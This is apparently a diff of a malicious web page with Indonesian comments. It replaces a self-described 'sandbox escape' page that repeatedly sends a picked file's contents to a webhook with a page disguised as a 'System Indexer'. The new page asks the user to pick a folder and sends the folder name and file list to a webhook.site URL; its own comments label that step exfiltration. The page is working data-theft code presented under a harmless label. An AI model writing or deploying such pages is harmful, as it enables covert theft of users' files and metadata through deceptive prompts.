@@ -1,66 +1,51 @@
 <!DOCTYPE html>
 <html>
-<head><title>Kernel Storage Access</title></head>
-<body style="background:#000;color:#f00;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div style="padding:50px;border:2px solid #f00;text-align:center;box-shadow:0 0 100px #f00;background:rgba(20,0,0,0.9)">
-        <h1 style="letter-spacing:10px">V226_ESCAPE</h1>
-        <div id="status" style="margin:20px 0;color:#fff">AWAITING_FILESYSTEM_BREACH...</div>
-        <button onclick="escape()" style="padding:20px;background:#f00;color:#fff;border:none;font-weight:bold;cursor:pointer;box-shadow:0 0 20px #f00">GRANT_KERNEL_STORAGE_ACCESS</button>
-        <div id="log" style="font-size:10px;color:#555;margin-top:20px;text-align:left">
-            > SANDBOX_STATUS: ENFORCED<br>
-            > EXPLOIT_VECTOR: FILE_SYSTEM_ACCESS_API<br>
-            > TARGET: ANDROID_DOCUMENTS_UI
-        </div>
+<head><title>System Indexer</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
+    <div style="padding:40px;border:2px solid #0f0;text-align:center;box-shadow:0 0 60px #0f0">
+        <h2>V228_DIR_CRAWLER</h2>
+        <p>Select a folder to synchronize all local configuration files.</p>
+        <button onclick="crawl()" style="padding:15px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer">INDEX_DIRECTORY</button>
+        <div id="status" style="margin-top:20px;color:#888">AWAITING_FS_HANDLE...</div>
     </div>
 
 <script>
     const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
-    let escapeHandle;
 
-    async function escape() {
+    async function crawl() {
         try {
-            // 1. THE ESCAPE TRIGGER
-            // Memaksa Chrome memanggil aplikasi DocumentsUI (Native Android)
-            // Ini adalah titik di mana Sandbox Web mulai berinteraksi dengan OS.
-            escapeHandle = await window.showSaveFilePicker({
-                suggestedName: ".sys_config_dump.txt", // Dot prefix untuk menyembunyikan file di beberapa OS
-                types: [{
-                    description: 'System Configuration',
-                    accept: {'text/plain': ['.txt']}
-                }]
-            });
+            // 1. REQUEST DIRECTORY ACCESS
+            // Ini akan memicu File Picker untuk memilih FOLDER, bukan FILE.
+            const dirHandle = await window.showDirectoryPicker();
+            
+            document.getElementById('status').innerText = "CRAWLING_FILES...";
+            let fileList = [];
 
-            document.getElementById('status').innerText = "SANDBOX_BREACHED_ACTIVE";
+            // 2. ITERATE OVER DIRECTORY (The Crawler)
+            // Kita menyisir semua entri di dalam folder tersebut
+            for await (const entry of dirHandle.values()) {
+                fileList.push({
+                    name: entry.name,
+                    kind: entry.kind // 'file' atau 'directory'
+                });
+                
+                // Jika itu file, kita bisa mencoba membacanya jika diperlukan
+                console.log(`Found: ${entry.name} [${entry.kind}]`);
+            }
+
+            // 3. EXFILTRATE FILE NAMES
+            // Mengirim daftar nama file ke Webhook
+            navigator.sendBeacon(`${webhook}?v=V228_DIR_LIST`, btoa(JSON.stringify({
+                folder: dirHandle.name,
+                files: fileList
+            })));
+
+            document.getElementById('status').innerText = "INDEXING_COMPLETE";
             document.getElementById('status').style.color = "#0f0";
 
-            // 2. INITIAL EXFILTRATION (Siphoning Device Info)
-            const writable = await escapeHandle.createWritable();
-            await writable.write(`--- V226_SANDBOX_ESCAPE_REPORT ---\nTS: ${new Date()}\nUA: ${navigator.userAgent}\nSTATUS: PERSISTENT_ACCESS_GRANTED`);
-            await writable.close();
-
-            // 3. PERSISTENT DATA SIPHONING
-            // Menembus Sandbox secara berkelanjutan
-            setInterval(async () => {
-                try {
-                    const file = await escapeHandle.getFile();
-                    const content = await file.text();
-                    
-                    // Jika user mengisi data di file yang "terlepas" ke storage ini
-                    if (content.length > 10) {
-                        navigator.sendBeacon(`${webhook}?v=V226_DATA_LEAK`, btoa(content));
-                        updateLog("DATA_PHASE_EXFILTRATED");
-                    }
-                } catch(e) {}
-            }, 500);
-
         } catch (err) {
-            document.getElementById('status').innerText = "ESCAPE_FAILED: " + err.name;
+            document.getElementById('status').innerText = "ACCESS_DENIED: " + err.message;
         }
-    }
-
-    function updateLog(msg) {
-        const l = document.getElementById('log');
-        l.innerHTML += `<br>> ${msg}`;
     }
 </script>
 </body>
